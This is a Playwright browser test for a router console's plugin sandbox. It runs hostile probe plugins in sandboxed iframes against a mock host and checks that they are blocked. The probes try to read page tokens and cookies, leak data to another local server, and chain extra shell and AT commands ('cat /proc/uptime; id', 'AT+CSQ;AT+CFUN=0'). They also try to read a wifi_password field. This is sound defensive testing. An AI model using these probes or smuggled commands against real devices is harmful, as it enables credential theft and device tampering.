// Browser test for Phases 4 and 5 (sandboxed plugins, host-checked calls). usage: node test_plugin_sandbox_browser.js INDEX_HTML   (needs Playwright; not part of validate.sh)
//
// It drives the REAL page in Chromium against a small Node server that follows the host's rules: the page's Content-Security-Policy header (the strict
// one from PluginGuard.kt), the session cookie plus marker header, and the Origin check. Plugins come from a fake GET /api/plugins, shaped like the
// real reply (mode, grant, integrity). A probe plugin runs INSIDE the sandbox and tries to reach the page, the session, the network, new windows and
// frames, and to call the bridge for things it was not given; it reports what happened. The server log shows what actually arrived at the host.
// Phase 5: device calls from the bridge go to POST /api/plugins/call, where this mock applies a port of sandboxCallError (Kotlin) to the CURRENT approval; a
// plugin whose file changes after the page loaded is refused by the host even though the page still holds the old grant.
// What it proves: what a real browser does with sandbox="allow-scripts", the frame's own policy and the MessageChannel bridge. What it does not test:
// the Kotlin (PluginSandboxTest.kt does, when gradle runs), a real F50, or other browsers (Firefox and Safari may differ).
const { chromium } = require('playwright'); const fs = require('fs'), http = require('http'), path = require('path');
const html = fs.readFileSync(process.argv[2], 'utf8');
const ktGuard = fs.readFileSync(path.join(__dirname, '../../app/src/main/java/com/matchi/tool/PluginGuard.kt'), 'utf8');
let fails = 0; const ok = (c, m) => { console.log((c ? 'PASS ' : 'FAIL ') + m); if (!c) fails++; };
// the strict policy, as PluginGuard.kt builds it (hosts: only GitHub, the default allow-list); each directive is checked against the Kotlin text
const DIRECTIVES = ["default-src 'self'", "script-src 'self' 'unsafe-inline' 'unsafe-eval'", "style-src 'self' 'unsafe-inline'", "object-src 'none'", "base-uri 'none'", "form-action 'self'", "frame-ancestors 'none'"];
ok(DIRECTIVES.every((d) => ktGuard.includes(d)), 'PluginGuard.kt still builds the policy this test sends');
const CSP = DIRECTIVES[0] + '; ' + DIRECTIVES[1] + '; ' + DIRECTIVES[2] + "; img-src 'self' data: blob: https://raw.githubusercontent.com; media-src 'self' data: blob:; font-src 'self' data:; connect-src 'self' https://raw.githubusercontent.com; " + DIRECTIVES.slice(3).join('; ');

const state = { changed: new Set() };   // plugins whose file changed AFTER the page loaded (the host sees it, the page's list is stale)
const AT_BARE = ['AT', 'ATI', 'AT+CSQ', 'AT+CESQ', 'AT+CGSN', 'AT+CIMI', 'AT+CCID', 'AT+CNUM', 'AT+CGMR', 'AT+CGMM', 'AT+CGMI'];
const isReadAt = (c) => { c = String(c).trim(); return c.length > 0 && c.length <= 64 && (AT_BARE.includes(c.toUpperCase()) || /^AT(\+[A-Z0-9_]+)?(\?|=\?)$/i.test(c)); };
// a port of sandboxCallError (PluginSandbox.kt) over the stored approval at the time of the call
function hostDecide(name, op, args) {
  const pl = plugins().find((x) => x.name === name);
  if (!pl || pl.mode !== 'sandbox') return ['not-sandboxed', 'This plugin does not run in the sandbox'];
  const grant = pl.integrity === 'ok' && !state.changed.has(name) ? pl.grant : [];
  const bad = (m) => ['not-approved', m];
  if (op === 'at') return !grant.includes('sbx:at.read') ? bad('not approved: at.read') : (args.length !== 1 || !isReadAt(args[0]) ? bad('only read-only AT commands are allowed') : null);
  if (op === 'router.get') { const ok = grant.filter((g) => g.startsWith('sbx:router:')).map((g) => g.slice(11)); return !ok.length ? bad('not approved: router') : (!args.length || args.length > 20 || args.some((a) => !ok.includes(a.trim())) ? bad('a router field was not approved') : null); }
  if (op === 'shell') return args.length === 1 && grant.includes('sbx:shell:' + args[0]) ? null : bad('not approved: only the exact commands this plugin declared with "shell:" may run');
  return bad('unknown operation');
}
const sessions = new Set(), log = [], otherLog = [], otherPageHits = []; let basePort = 0, otherPort = 0;
const cookieOf = (h) => { for (const p of String(h || '').split(';')) { const t = p.trim(), i = t.indexOf('='); if (i > 0 && t.slice(0, i) === 'matchi_sid') return t.slice(i + 1); } return null; };
const base = () => `http://127.0.0.1:${basePort}`;

const probe = () => `// Probe
// @matchi-needs at.read
// @matchi-needs router: signalbar
// @matchi-needs shell: cat /proc/uptime
(async () => {
  const R = {};
  const t = async (k, f) => { try { R[k] = await f(); } catch (e) { R[k] = 'ERR:' + ((e && e.name) || '') + ':' + String((e && e.message) || e).slice(0, 90); } };
  const wait = (ms) => new Promise((r) => setTimeout(r, ms));
  await t('parentDom', () => parent.document.title);
  await t('parentToken', () => parent.TOKEN);
  await t('topToken', () => top.TOKEN);
  await t('localStorage', () => String(localStorage.getItem('x')));
  await t('sessionStorage', () => String(sessionStorage.length));
  await t('cookie', () => document.cookie);
  await t('origin', () => String(location.origin));
  await t('fetchRelative', () => fetch('/api/ping?sbx=rel').then((r) => 'status ' + r.status));
  await t('fetchAbsolute', () => fetch('${base()}/api/ping?sbx=abs', { credentials: 'include', headers: { 'x-token': 'cookie' } }).then((r) => 'status ' + r.status));
  await t('fetchOtherPort', () => fetch('http://127.0.0.1:${otherPort}/?sbx=other', { mode: 'no-cors' }).then(() => 'sent'));
  await t('xhr', () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open('GET', '${base()}/api/ping?sbx=xhr'); x.onload = () => res('status ' + x.status); x.onerror = () => rej(new Error('network error')); x.send(); }));
  await t('beacon', () => String(navigator.sendBeacon('${base()}/api/ping?sbx=beacon', 'x')));
  await t('image', () => new Promise((res) => { const i = new Image(); i.onload = () => res('loaded'); i.onerror = () => res('error'); i.src = '${base()}/api/ping?sbx=img'; }));
  await t('eval', () => String(eval('1+1')));
  await t('newFunction', () => String(new Function('return 2')()));
  await t('openWindow', () => String(window.open('${base()}/?sbx=popup')));
  await t('topNavigation', () => { top.location.href = '${base()}/?sbx=topnav'; return 'no error'; });
  await t('form', async () => { const f = document.createElement('form'); f.action = '${base()}/api/ping?sbx=form'; f.method = 'get'; document.body.appendChild(f); f.submit(); await wait(400); return 'submitted'; });
  await t('nestedFrame', async () => { const f = document.createElement('iframe'); f.src = '${base()}/api/ping?sbx=frame'; document.body.appendChild(f); await wait(400); return 'added'; });
  await t('worker', () => new Promise((res, rej) => { const w = new Worker('data:text/javascript,postMessage(1)'); w.onmessage = () => res('running'); w.onerror = () => rej(new Error('worker failed')); setTimeout(() => rej(new Error('worker never ran')), 700); }));
  // the bridge: what it should allow, and what it should refuse
  await t('at_read', () => matchi.at('AT+CSQ'));
  await t('at_write', () => matchi.at('AT+CFUN=0'));
  await t('at_chain', () => matchi.at('AT+CSQ;AT+CFUN=0'));
  await t('router_ok', () => matchi.router.get(['signalbar']));
  await t('router_other', () => matchi.router.get(['wifi_password']));
  await t('router_mixed', () => matchi.router.get(['signalbar', 'wifi_password']));
  await t('shell_ok', () => matchi.shell('cat /proc/uptime'));
  await t('shell_other', () => matchi.shell('id'));
  await t('shell_chain', () => matchi.shell('cat /proc/uptime; id'));
  await t('shell_space', () => matchi.shell('cat /proc/uptime '));
  await t('info', () => matchi.info());
  await t('storage', async () => { await matchi.storage.set('a', '1'); return await matchi.storage.get('a'); });
  await t('overrideBridge', () => { 'use strict'; window.matchi = {}; return 'replaced'; });
  await matchi.storage.set('report', JSON.stringify(R));
})();`;

const bare = `// Tries the device calls with nothing declared
(async () => {
  const R = {};
  const t = async (k, f) => { try { R[k] = await f(); } catch (e) { R[k] = 'ERR:' + String((e && e.message) || e).slice(0, 90); } };
  await t('at', () => matchi.at('AT+CSQ'));
  await t('router', () => matchi.router.get(['signalbar']));
  await t('shell', () => matchi.shell('cat /proc/uptime'));
  await t('toast', () => matchi.toast('hello from the bare plugin'));
  await matchi.storage.set('report', JSON.stringify(R));
})();`;

const nav = () => `// Moves its own frame to a page of the host, to see whether the new page gets the bridge
(async () => { await matchi.storage.set('report', 'before'); location.replace('${base()}/__other'); })();`;

const leak = () => `// Sends its frame to another site with data in the address
(async () => { await matchi.storage.set('report', 'before'); location.href = 'http://127.0.0.1:${otherPort}/?leak=secret'; })();`;

const trojan = `// @matchi-needs shell: cat /proc/uptime
// Declared a command, but the file no longer matches what was approved (grant is empty)
(async () => { let r; try { r = await matchi.shell('cat /proc/uptime'); } catch (e) { r = 'ERR:' + e.message; } await matchi.storage.set('report', JSON.stringify({ shell: r })); })();`;

const later = `// @matchi-needs shell: cat /proc/uptime
(async () => {
  const wait = (ms) => new Promise((r) => setTimeout(r, ms));
  const until = async (k) => { while ((await matchi.storage.get(k)) !== '1') await wait(100); };
  const once = async () => { try { return await matchi.shell('cat /proc/uptime'); } catch (e) { return 'ERR:' + e.message; } };
  await until('go1'); await matchi.storage.set('r1', JSON.stringify(await once()));
  await until('go2'); await matchi.storage.set('r2', JSON.stringify(await once()));
})();`;

const THIEF = "window.__trusted={tokenVar:(typeof TOKEN!=='undefined'?TOKEN:null),parentIsSelf:window.parent===window,inFrame:window!==window.top};";

const plugins = () => [
  { name: 'Sbx_Probe.js', code: probe(), enabled: true, kind: 'js', title: 'Probe', risk: 'ok', sha256: 'a'.repeat(64), integrity: 'ok', caps: ['sbx:at.read', 'sbx:router:signalbar', 'sbx:shell:cat /proc/uptime'], mode: 'sandbox', declared: ['sbx:at.read', 'sbx:router:signalbar', 'sbx:shell:cat /proc/uptime'], sbxProblems: [], grant: ['sbx:at.read', 'sbx:router:signalbar', 'sbx:shell:cat /proc/uptime'] },
  { name: 'Sbx_Bare.js', code: bare, enabled: true, kind: 'js', title: 'Bare', risk: 'ok', sha256: 'b'.repeat(64), integrity: 'ok', caps: [], mode: 'sandbox', declared: [], sbxProblems: [], grant: [] },
  { name: 'Sbx_Nav.js', code: nav(), enabled: true, kind: 'js', title: 'Nav', risk: 'ok', sha256: 'c'.repeat(64), integrity: 'ok', caps: [], mode: 'sandbox', declared: [], sbxProblems: [], grant: [] },
  { name: 'Sbx_Leak.js', code: leak(), enabled: true, kind: 'js', title: 'Leak', risk: 'ok', sha256: 'd'.repeat(64), integrity: 'ok', caps: [], mode: 'sandbox', declared: [], sbxProblems: [], grant: [] },
  { name: 'Sbx_Changed.js', code: trojan, enabled: true, kind: 'js', title: 'Changed', risk: 'ok', sha256: 'e'.repeat(64), integrity: 'changed', caps: ['sbx:shell:cat /proc/uptime'], mode: 'sandbox', declared: ['sbx:shell:cat /proc/uptime'], sbxProblems: [], grant: [] },
  { name: 'Sbx_Later.js', code: later, enabled: true, kind: 'js', title: 'Later', risk: 'ok', sha256: '1'.repeat(64), integrity: 'ok', caps: ['sbx:shell:cat /proc/uptime'], mode: 'sandbox', declared: ['sbx:shell:cat /proc/uptime'], sbxProblems: [], grant: ['sbx:shell:cat /proc/uptime'] },
  { name: 'Trusted_One.js', code: THIEF, enabled: true, kind: 'js', title: 'Trusted', risk: 'ok', sha256: 'f'.repeat(64), integrity: 'ok', caps: ['token'], mode: 'trusted', declared: [] },
];

const primary = http.createServer((req, res) => {
  const u = new URL(req.url, 'http://x'); const chunks = [];
  req.on('data', (c) => chunks.push(c)); req.on('end', () => {
    const bodyText = Buffer.concat(chunks).toString();
    const send = (code, o, extra = {}) => { res.writeHead(code, { 'content-type': 'application/json', ...extra }); res.end(JSON.stringify(o)); };
    const origin = req.headers.origin, cookie = cookieOf(req.headers.cookie), marker = req.headers['x-token'];
    const entry = { p: u.pathname, q: u.search, m: req.method, origin: origin || null, hadCookie: !!cookie, marker: marker === undefined ? null : marker, plugin: req.headers['x-matchi-plugin'] || null, body: bodyText.slice(0, 300) };
    if (u.pathname === '/') { res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'content-security-policy': CSP }); return res.end(html); }
    if (u.pathname === '/__other') { otherPageHits.push(req.headers['sec-fetch-dest'] + ' ' + (req.headers.referer || ''));  res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });   // no policy on purpose: this page stands for a hostile one
      return res.end("<!doctype html><script>window.addEventListener('message',function(e){navigator.sendBeacon('/api/beacon?got='+(e.ports&&e.ports.length?'PORT':'none'))});setTimeout(function(){navigator.sendBeacon('/api/beacon?waited=1')},1500)</script>"); }
    if (!u.pathname.startsWith('/api/')) { res.writeHead(404); return res.end('404'); }
    log.push(entry);
    if (origin && origin !== 'http://' + req.headers.host) { entry.refused = 'origin'; return send(403, { error: 'cross-origin request refused' }); }   // WebServer.serve: "Origin: null" lands here
    if (u.pathname === '/api/login' && req.method === 'POST') {
      let pw = ''; try { pw = JSON.parse(bodyText || '{}').password; } catch (_) {}
      if (pw !== 'pw') return send(401, { error: 'Wrong password' });
      const tok = require('crypto').randomBytes(32).toString('hex'); sessions.add(tok);
      return send(200, { ok: true }, { 'set-cookie': `matchi_sid=${tok}; Path=/api; HttpOnly; SameSite=Strict` });
    }
    const authed = !!(marker && cookie && sessions.has(cookie)); entry.authed = authed;
    if (!authed) return send(401, { error: 'Session expired or invalid - log in again' });
    if (u.pathname === '/api/plugins' && req.method === 'GET') return send(200, plugins());
    if (u.pathname === '/api/plugins/call' && req.method === 'POST') {
      let r = {}; try { r = JSON.parse(bodyText); } catch (_) {}
      const why = hostDecide(String(r.name), String(r.op), Array.isArray(r.args) ? r.args : []);
      entry.call = { name: r.name, op: r.op, args: r.args }; if (why) { entry.refusedByHost = why[1]; return send(403, { code: why[0], error: why[1] }); }
      if (r.op === 'at') return send(200, { success: true, result: '+CSQ: 20,99' });
      if (r.op === 'router.get') return send(200, { signalbar: '4' });
      return send(200, { success: true, content: 'up 3 days' });
    }
    if (u.pathname === '/api/at' && req.method === 'POST') return send(200, { ok: true, result: '+CSQ: 20,99' });
    if (u.pathname === '/api/goform/goform_get_cmd_process') return send(200, { signalbar: '4' });
    if (u.pathname === '/api/shell' && req.method === 'POST') return send(200, { success: true, content: 'up 3 days' });
    if (u.pathname === '/api/ping') return send(200, { ok: true });
    return send(200, {});
  });
});
const other = http.createServer((req, res) => { otherLog.push(req.url); res.writeHead(200, { 'content-type': 'text/html' }); res.end('<!doctype html><title>other</title>'); });

(async () => {
  await new Promise((r) => primary.listen(0, '127.0.0.1', r)); await new Promise((r) => other.listen(0, '127.0.0.1', r));
  basePort = primary.address().port; otherPort = other.address().port;
  // plugin sources hold the ports, so rebuild them now
  const b = await chromium.launch(); const ctx = await b.newContext({ viewport: { width: 900, height: 900 } });
  const page = await ctx.newPage(); const errors = [], toasts = [];
  page.on('pageerror', (e) => errors.push(e.message));
  page.on('console', (m) => { if (m.type() === 'error' || m.type() === 'warning') errors.push('console: ' + m.text().slice(0, 160)); });
  await page.goto(base() + '/'); await page.waitForTimeout(600);
  await page.fill('#tok', 'pw'); await page.click('#tokbtn');
  const rep = async (name, ms = 12000) => { const key = 'matchi_sbx:' + name + '/report'; const t0 = Date.now(); while (Date.now() - t0 < ms) { const v = await page.evaluate((k) => localStorage.getItem(k), key); if (v !== null) return v; await page.waitForTimeout(150); } return null; };

  // ---- the frame itself
  const probeRaw = await rep('Sbx_Probe.js');
  ok(probeRaw !== null, 'the sandboxed probe ran inside the page without being opened (it reported through its bridge storage)');
  const R = probeRaw ? JSON.parse(probeRaw) : {};
  const frames = await page.evaluate(() => [...document.querySelectorAll('iframe')].map((f) => ({ sandbox: f.getAttribute('sandbox'), title: f.title, hasSrcdoc: f.hasAttribute('srcdoc'), src: f.getAttribute('src') })));
  ok(frames.length >= 5 && frames.every((f) => f.sandbox === 'allow-scripts' && f.hasSrcdoc && !f.src), `every sandboxed plugin has its own iframe with sandbox="allow-scripts" and no allow-same-origin (${frames.length} frames)`);
  const trusted = await page.evaluate(() => window.__trusted);
  ok(trusted && trusted.tokenVar === 'cookie' && trusted.parentIsSelf === true, 'a trusted plugin still runs in the page itself (default behaviour unchanged)');

  // ---- what the probe could reach
  const blocked = (k, why) => ok(typeof R[k] === 'string' && R[k].startsWith('ERR'), `${why}: ${R[k]}`);
  blocked('parentDom', 'cannot read the page DOM'); blocked('parentToken', 'cannot read the page variable TOKEN'); blocked('topToken', 'cannot read TOKEN through top');
  blocked('localStorage', 'has no localStorage'); blocked('sessionStorage', 'has no sessionStorage'); blocked('cookie', 'cannot read cookies');
  ok(R.origin === 'null', 'its origin is opaque: ' + R.origin);
  blocked('fetchRelative', 'fetch to a relative /api path fails'); blocked('fetchAbsolute', 'fetch to the host with cookie and marker header fails'); blocked('fetchOtherPort', 'fetch to another local port fails');
  blocked('xhr', 'XMLHttpRequest to the host fails'); blocked('eval', 'eval is blocked'); blocked('newFunction', 'new Function is blocked');
  ok(R.image === 'error', 'an image request to the host fails: ' + R.image);
  ok(R.openWindow === 'null', 'window.open gives nothing (no popups): ' + R.openWindow);
  blocked('topNavigation', 'it cannot navigate the console page');
  blocked('worker', 'workers are blocked');
  await page.waitForTimeout(600);
  const fromSandbox = log.filter((x) => /sbx=/.test(x.q));
  ok(fromSandbox.length === 0, 'the host saw NO request from the probe\'s attempts (fetch, XHR, beacon, image, form, nested frame, popup, top navigation): ' + JSON.stringify(fromSandbox.map((x) => x.q + (x.refused ? ' refused' : ''))));
  ok(otherLog.filter((x) => /sbx=other/.test(x)).length === 0, 'the other local server saw nothing from the probe either');
  ok(log.every((x) => x.origin !== 'null' || x.p === '/api/beacon'), 'no request with Origin: null reached the host from the probe');

  // ---- the bridge
  ok(R.at_read && R.at_read.success === true && String(R.at_read.result).includes('+CSQ'), 'bridge: a read-only AT command works');
  blocked('at_write', 'bridge: an AT write is refused'); blocked('at_chain', 'bridge: a chained AT command is refused');
  ok(R.router_ok && R.router_ok.signalbar === '4', 'bridge: an approved router field is read');
  blocked('router_other', 'bridge: a router field that was not approved is refused'); blocked('router_mixed', 'bridge: one unapproved field refuses the call');
  ok(R.shell_ok && R.shell_ok.success === true, 'bridge: the exact declared root command runs');
  blocked('shell_other', 'bridge: another command is refused'); blocked('shell_chain', 'bridge: the command with something added is refused'); blocked('shell_space', 'bridge: the command with a trailing space is refused');
  ok(R.info && R.info.name === 'Sbx_Probe.js' && R.info.granted.length === 3, 'bridge: info() reports the approved list');
  ok(R.storage === '1', 'bridge: the private storage works');
  const calls = log.filter((x) => x.p === '/api/plugins/call' && x.call);
  const by = (op) => calls.filter((x) => x.call.op === op);
  ok(by('at').length >= 1 && by('at').every((x) => x.call.name === 'Sbx_Probe.js' && JSON.stringify(x.call.args) === '["AT+CSQ"]' && !x.refusedByHost), 'the host received only the one AT read, from the probe: ' + JSON.stringify(by('at').map((x) => x.call.args)));
  ok(by('shell').some((x) => x.call.name === 'Sbx_Probe.js') && by('shell').every((x) => JSON.stringify(x.call.args) === '["cat /proc/uptime"]'), 'the host received only the exact shell command: ' + JSON.stringify(by('shell').map((x) => x.call.args)));
  ok(by('router.get').length >= 1 && by('router.get').every((x) => JSON.stringify(x.call.args) === '["signalbar"]'), 'the host received only the approved router field');
  ok(!log.some((x) => (x.p === '/api/at' && x.plugin === 'Sbx_Probe.js') || (x.p === '/api/shell' && x.plugin === 'Sbx_Probe.js')), 'device calls no longer go through the generic /api/at and /api/shell routes');
  ok(calls.every((x) => !x.refusedByHost || x.call.name === 'Sbx_Later.js'), 'the page\'s own check stopped every bad call before it reached the host (only the staleness case below got there)');

  // ---- no grant
  const bareR = JSON.parse((await rep('Sbx_Bare.js')) || '{}');
  ok(['at', 'router', 'shell'].every((k) => typeof bareR[k] === 'string' && bareR[k].includes('not approved')), 'a plugin that declared nothing is refused every device call: ' + JSON.stringify(bareR));
  const chg = JSON.parse((await rep('Sbx_Changed.js')) || '{}');
  ok(typeof chg.shell === 'string' && chg.shell.includes('not approved'), 'a plugin whose file changed since approval (empty grant) gets nothing, even for what it declares: ' + chg.shell);
  ok(!calls.some((x) => x.call.name === 'Sbx_Changed.js' || x.call.name === 'Sbx_Bare.js'), 'and no call was made to the host for it or for the plugin that declared nothing');

  // ---- Phase 5: the host decides from the CURRENT approval, not the grant the page loaded
  const setKey = (k) => page.evaluate((key) => localStorage.setItem(key, '1'), 'matchi_sbx:Sbx_Later.js/' + k);
  const getKey = async (k) => { const t0 = Date.now(); while (Date.now() - t0 < 8000) { const v = await page.evaluate((key) => localStorage.getItem(key), 'matchi_sbx:Sbx_Later.js/' + k); if (v !== null) return JSON.parse(v); await page.waitForTimeout(150); } return null; };
  await setKey('go1'); const r1 = await getKey('r1');
  ok(r1 && r1.success === true, 'before the file changes, the declared command runs through the host: ' + JSON.stringify(r1));
  state.changed.add('Sbx_Later.js');   // the file is edited on the device after the page loaded; the page still holds the old grant
  await setKey('go2'); const r2 = await getKey('r2');
  ok(typeof r2 === 'string' && r2.includes('not approved'), 'after the file changed, the same call is refused BY THE HOST: ' + JSON.stringify(r2));
  ok(log.some((x) => x.p === '/api/plugins/call' && x.call && x.call.name === 'Sbx_Later.js' && x.refusedByHost), 'the host log shows the refusal (the page had let it through)');

  // ---- toast comes from the bridge but is labelled
  const toastText = await page.evaluate(() => [...document.querySelectorAll('body *')].map((e) => e.children.length === 0 ? e.textContent : '').filter((t) => /hello from the bare plugin/.test(t)));
  ok(toastText.length >= 1 && toastText.some((t) => t.startsWith('[Bare] ')), 'a bridge toast is shown with the plugin\'s name in front: ' + JSON.stringify(toastText));

  // ---- the window: launcher button, modal, hide
  const launcher = await page.evaluate(() => [...document.querySelectorAll('.matchi-menu-box button[data-sbx]')].map((x) => x.dataset.sbx));
  ok(launcher.includes('Sbx_Probe.js'), 'the plugin menu has a button for each sandboxed plugin: ' + launcher.join(', '));
  await page.evaluate(() => { document.getElementById('matchi_menu_btn').style.display = ''; document.getElementById('matchi_menu_btn').click(); });
  await page.click('.matchi-menu-box button[data-sbx="Sbx_Probe.js"]');
  await page.waitForTimeout(300);
  ok(await page.evaluate(() => document.getElementById('sbx_Sbx_Probe_js').classList.contains('show')), 'the button opens the plugin window');
  ok(await page.evaluate(() => /It may:/.test(document.getElementById('sbx_Sbx_Probe_js').textContent) && /AT commands/.test(document.getElementById('sbx_Sbx_Probe_js').textContent)), 'and the window lists what the plugin may do');
  await page.click('#sbx_Sbx_Probe_js_close'); await page.waitForTimeout(500);
  ok(!(await page.evaluate(() => document.getElementById('sbx_Sbx_Probe_js').classList.contains('show'))) && await page.evaluate(() => !!document.getElementById('sbx_Sbx_Probe_js')), 'Close hides it and keeps the plugin running');

  // ---- a frame that leaves: it gets no bridge, and the new page never gets a port
  await page.waitForTimeout(2500);
  const beacons = log.filter((x) => x.p === '/api/beacon');
  console.log('INFO /__other hits: ' + JSON.stringify(otherPageHits) + ' beacons: ' + JSON.stringify(beacons.map((x) => x.q + (x.refused ? ' refused' : ''))));
  ok(otherPageHits.length >= 1, 'the navigated frame loaded the host page /__other');
  ok(beacons.some((x) => /waited=1/.test(x.q)), 'and the script of that page ran (it sent its beacon)');
  ok(!beacons.some((x) => /got=/.test(x.q)), 'the other page was never handed a port: ' + beacons.map((x) => x.q).join(' '));
  ok(await page.evaluate(() => !!sbxEntries.get('Sbx_Nav.js') && sbxEntries.get('Sbx_Nav.js').dead === true), 'the page marked that plugin\'s bridge as closed');
  ok(otherLog.filter((x) => /leak=/.test(x)).length === 0, 'a frame sent to another site was refused by the console page\'s policy (frame-src falls back to default-src \'self\'): the other server saw ' + JSON.stringify(otherLog));
  const leakState = await page.evaluate(() => { const e = sbxEntries.get('Sbx_Leak.js'); return { dead: e.dead, report: localStorage.getItem('matchi_sbx:Sbx_Leak.js/report') }; });
  ok(leakState.report === 'before', 'the leaking plugin did run and tried (it stored its marker first): ' + JSON.stringify(leakState));

  // ---- nothing leaked through the page
  ok(await page.evaluate(() => !document.cookie.includes('matchi_sid')), 'the session cookie is still not readable by page script');
  const allPageErrors = errors.filter((e) => !/Refused to|blocked by CSP|Content Security Policy|Failed to load resource|net::ERR|violates|Blocked opening|Unsafe attempt|sandboxed frame|form submission/i.test(e));
  ok(!allPageErrors.length, 'no unexpected page errors (CSP refusals from the probe are expected): ' + allPageErrors.join(' | '));
  await b.close(); primary.close(); other.close();
  console.log(fails ? `\n${fails} FAILED` : '\nall passed'); process.exit(fails ? 1 : 0);
})();
